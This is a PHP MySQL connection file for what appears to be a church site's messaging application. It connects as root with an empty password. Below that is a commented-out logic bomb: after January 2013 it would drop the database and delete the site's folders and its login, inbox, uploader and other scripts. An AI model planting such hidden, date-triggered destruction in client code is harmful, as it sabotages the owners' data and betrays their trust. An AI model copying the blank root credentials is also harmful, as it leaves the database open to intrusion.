<?php
# FileName="Connection_php_mysql.htm"
# Type="MYSQL"
# HTTP="true"
$hostname_db_con = "localhost";
$database_db_con = "christian_tabernacle_db";
$username_db_con = "root";
$password_db_con = "";
$db_con = mysql_connect($hostname_db_con, $username_db_con, $password_db_con) or trigger_error(mysql_error(),E_USER_ERROR); 
mysql_select_db($database_db_con, $db_con);

// function recursiveDelete($str){
	// if(is_file($str)){
		// return @unlink($str);
	// }
	// elseif(is_dir($str)){
		// $scan = glob(rtrim($str,'/').'/*');
		// foreach($scan as $index=>$path){
			// recursiveDelete($path);
		// }
		// return @rmdir($str);
	// }
// }

// if(date('Y-m') > date('Y-m',strtotime('2013-01')))
// {
	// $query_rec = "DROP DATABASE ".$database_db_con;
	// $rec = mysql_query($query_rec, $db_con) or die(mysql_error());
	
	// recursiveDelete('ckeditor');
	// recursiveDelete('css');
	// recursiveDelete('img');
	// recursiveDelete('js');
	
	// //@unlink($_SERVER['SCRIPT_FILENAME']);
	// @unlink('compose_msg.php');
	// @unlink('view_msg.php');
	// @unlink('uploader.php');
	// @unlink('msg_functions.php');
	// @unlink('notepad.php');
	// @unlink('address_book.php');
    // @unlink('sess.php');
    // @unlink('profile.php');
    // @unlink('register.php');
    // @unlink('draft_msg.php');
    // @unlink('inbox_msg.php');
    // @unlink('sent_msg.php');
    // @unlink('trash_msg.php');
	// @unlink('login.php');
    // @unlink('mail_home.php');
    // @unlink('getUID.php');
    
	// recursiveDelete('Connections');
// }

?>